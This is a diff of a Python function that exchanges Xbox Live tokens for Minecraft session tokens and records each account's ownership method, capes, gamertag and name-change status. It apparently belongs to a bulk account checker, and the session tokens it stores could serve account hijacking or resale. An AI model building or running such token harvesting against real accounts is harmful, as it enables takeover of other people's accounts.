@@ -30,9 +30,10 @@ from minecraft.get_profile import get_profile
 from minecraft.get_ssid import get_ssid
 
 from minecraft.get_namechange import get_username_info
-from minecraft.get_method import get_method
+from minecraft.get_method import get_method_details
 from minecraft.get_capes import get_capes
 from minecraft.get_xbl import get_xbl
+from minecraft.retry import NoMinecraftEntitlement
 
 from database.database import DBConnection
 import asyncio
@@ -147,7 +148,16 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
     if gtg:
         account_info["minecraft"]["gamertag"] = gtg
 
-    ssid = await get_ssid(xbl)
+    try:
+        ssid = await get_ssid(xbl)
+    except NoMinecraftEntitlement as exc:
+        print(f"[x] - No Minecraft entitlement from login_with_xbox ({exc})")
+        account_info["minecraft"]["name"] = "No Minecraft"
+        account_info["minecraft"]["method"] = "Not purchased"
+        account_info["minecraft"]["SSID"] = False
+        account_info["minecraft"]["entitlements"] = "no_entitlement"
+        return "no_mc"
+
     if not ssid:
         # XBL worked but SSID failed — often rate-limit / auth race, not "no MC"
         print("[x] - Failed to get SSID (retryable — NOT marking as no MC)")
@@ -158,8 +168,32 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
         account_info["minecraft"]["method"] = "Unknown (MC check failed)"
         return "transient"
 
-    print("[+] - Got SSID! (Has Minecraft)")
+    print("[+] - Got SSID (Minecraft access token)")
     account_info["minecraft"]["SSID"] = ssid
+
+    # Ownership type from game_minecraft entitlement source (PURCHASE vs GAMEPASS)
+    entitlements = await get_method_details(ssid)
+    method = entitlements.get("method")
+    account_info["minecraft"]["entitlements"] = entitlements.get("items_summary") or []
+    account_info["minecraft"]["entitlement_source"] = entitlements.get(
+        "game_minecraft_source"
+    ) or entitlements.get("product_minecraft_source")
+    if method:
+        account_info["minecraft"]["method"] = method
+        src = account_info["minecraft"]["entitlement_source"] or "?"
+        print(
+            f"[+] - Ownership via entitlements: {method} "
+            f"(game_minecraft source={src}, endpoint={entitlements.get('endpoint')})"
+        )
+        if entitlements.get("items_summary"):
+            print(f"    items: {', '.join(str(x) for x in entitlements['items_summary'][:12])}")
+    else:
+        # SSID worked but no game_minecraft / product_minecraft with known source
+        if entitlements.get("owns_minecraft") is False:
+            account_info["minecraft"]["method"] = "Not purchased"
+            print("[x] - Entitlements: no game_minecraft ownership")
+        else:
+            print("[!] - Entitlements inconclusive — leaving method unset")
 
     try:
         capes = await get_capes(ssid)
@@ -189,15 +223,10 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
         else:
             account_info["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
     else:
-        print("[x] - No Java profile (Bedrock/Game Pass only)")
+        print("[x] - No Java profile (Bedrock/Game Pass only / never launched)")
         account_info["minecraft"]["name"] = f"{gtg} (No Java)" if gtg else "Owned — No Java Profile"
         account_info["minecraft"]["uchange"] = "N/A"
         profile = None
-
-    method = await get_method(ssid)
-    if method:
-        account_info["minecraft"]["method"] = method
-        print("[+] - Got purchase method")
 
     return "ok" if profile else "no_java"
 
